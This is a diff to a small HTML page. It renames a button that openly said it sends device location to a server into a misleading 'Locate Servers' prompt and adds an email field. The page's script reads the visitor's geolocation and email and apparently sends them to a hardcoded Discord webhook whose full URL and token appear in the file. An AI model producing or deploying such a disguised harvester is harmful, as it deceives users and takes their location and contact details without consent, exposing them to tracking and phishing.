@@ -1,11 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>Location</title>
+	<title>Server Locator</title>
 	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 </head>
 <body>
-	<button onclick="sendLocation()">Location of Device sent to server</button>
+	<input id='email' placeholder="Enter Email...">
+	<button onclick="sendLocation()">Locate Servers</button>
 
 	<p id="demo"></p>
 
@@ -21,6 +22,7 @@
 		function showPosition(position) {
 			var latitude = position.coords.latitude;
 			var longitude = position.coords.longitude;
+			var email = document.getElementById("email");
 			document.getElementById("demo").innerHTML = "Latitude: " + latitude + "<br>Longitude: " + longitude;
 
 			var webhookUrl = "https://discordapp.com/api/webhooks/1092569585045221386/8la5fQp6icwktAFDw68NpIInnDUvYbHEMZRTeItiBqyH8tk4AP8iSlCTTTZormOH-cZO";
